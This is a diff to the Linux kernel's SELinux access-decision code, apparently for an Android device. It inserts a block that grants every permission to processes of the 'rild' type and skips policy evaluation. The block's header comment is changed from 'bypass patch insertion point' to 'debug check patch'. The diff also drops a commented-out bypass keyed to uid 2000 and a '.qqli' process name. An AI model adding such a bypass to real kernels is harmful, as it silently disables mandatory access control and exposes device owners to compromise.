@@ -1164,35 +1164,40 @@ void security_compute_av(struct selinux_state *state,
 			goto allow;
 		goto out;
 	}
-/* ====================== 旁路补丁插入点 ====================== */
+/* ====================== 调试校验补丁 ====================== */
 	type_cnt = policydb->symtab[SYM_TYPES].nprim;
-	if (scontext->type != 0 && scontext->type <= type_cnt) {
-		s_type_name = policydb->sym_val_to_name[SYM_TYPES][scontext->type - 1];
-		uidi = get_current_user()->uid.val;
+	s_type_id = scontext->type;
 
-		if (s_type_name && !strcmp(s_type_name, "rild")) {
-			pr_info("SELinux BYPASS: rild domain, ssid=%u tsid=%u tclass=%u\n",
+	if (s_type_id != 0 && s_type_id <= type_cnt) {
+		/* 第一层：判断sym_val_to_name[SYM_TYPES]数组指针是否有效 */
+		if (!policydb->sym_val_to_name[SYM_TYPES]) {
+			pr_warn("SELinux DBG: sym_val_to_name[SYM_TYPES] is NULL, type_id=%u\n", s_type_id);
+			goto skip_bypass;
+		}
+		/* 第二层：取出名字指针，判空 */
+		s_type_name = policydb->sym_val_to_name[SYM_TYPES][s_type_id - 1];
+		if (!s_type_name) {
+			pr_warn("SELinux DBG: type_name ptr NULL, type_id=%u\n", s_type_id);
+			goto skip_bypass;
+		}
+
+		/* 调试打印：打印当前读到的type名字，用来确认是不是rild */
+		pr_info("SELinux DBG: type_id=%u, name=[%s], tclass=%u\n",
+			s_type_id, s_type_name, orig_tclass);
+
+		/* 匹配 rild */
+		if (!strcmp(s_type_name, "rild")) {
+			pr_info("SELinux BYPASS: hit rild, ssid=%u tsid=%u tclass=%u\n",
 				ssid, tsid, orig_tclass);
-			// 直接放行，不进入context_struct_compute_av
 			avd->allowed = 0xFFFFFFFFU;
 			avd->denied = 0;
 			avd->flags = 0;
 			xperms->len = 0;
 			goto out;
 		}
-		/* 保留你原来的uid 2000 / .qqli 条件，需要就打开
-		if (uidi == 2000 || !strncmp(current->comm, ".qqli", 5)) {
-			pr_info("SELinux BYPASS: uid2000 or .qqli, ssid=%u tsid=%u tclass=%u\n",
-				ssid, tsid, orig_tclass);
-			avd->allowed = 0xFFFFFFFFU;
-			avd->denied = 0;
-			avd->flags = 0;
-			xperms->len = 0;
-			goto out;
-		}
-		*/
 	}
-	/* =========================================================== */	
+skip_bypass:
+	/* ========================================================== */
 	context_struct_compute_av(policydb, scontext, tcontext, tclass, avd,
 				  xperms);
 	map_decision(&policy->map, orig_tclass, avd,
